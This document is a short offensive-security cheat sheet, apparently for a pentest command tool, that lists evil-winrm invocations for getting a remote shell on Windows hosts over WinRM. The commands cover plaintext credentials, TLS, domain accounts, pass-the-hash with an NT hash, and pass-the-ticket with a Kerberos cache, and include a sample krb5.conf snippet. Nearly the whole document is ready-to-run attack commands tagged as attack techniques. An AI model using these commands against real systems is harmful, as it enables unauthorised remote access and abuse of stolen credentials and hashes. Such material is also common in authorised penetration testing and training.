# evil-winrm
% windows, remote, winrm, evilwinrm, 5985, 5986
#plateform/linux  #target/remote  #protocol/winrm #port/5985 #port/5986 #cat/ATTACK/CONNECT 

## _desc
```
```

## _repo
```
```

## _doc
```
```

## _install
```
gem install evil-winrm
```

## local account with creds
```bash
evil-winrm -i <ip> -u <user> -p '<password>'
```


## local account with creds (over TLS)
```bash
evil-winrm -i <ip> -u <user> -p '<password>' --ssl -Port 5986
```

## domain account with creds
```bash
(cd /opt/evil-winrm && evil-winrm --log -i <ip> -u '<domain_netbios>\<user>' -p '<password>' -s /opt/evil-winrm/ps -e /opt/evil-winrm/bin) 
```

## local account pth
```bash
(cd /opt/evil-winrm && evil-winrm --log -i <ip> -u <user> -H <nt_hash> -s /opt/evil-winrm/ps -e /opt/evil-winrm/bin)
```

## domain account pth
```bash
(cd /opt/evil-winrm && evil-winrm --log -i <ip> -u '<domain_netbios>\<user>' -H <nt_hash> -s /opt/evil-winrm/ps -e /opt/evil-winrm/bin)
```

## pass the ticket
add realm /etc/krb5.conf
[libdefaults]
        rdns=false
[realms]
CONTOSO.COM = {
             kdc = fooserver.contoso.com
 }
```bash
(cd /opt/evil-winrm && export KRB5CCNAME=<ccache> && evil-winrm --log -i <target_fqdn>  --realm <REALM_FQDN> -s /opt/evil-winrm/ps -e /opt/evil-winrm/bin)
```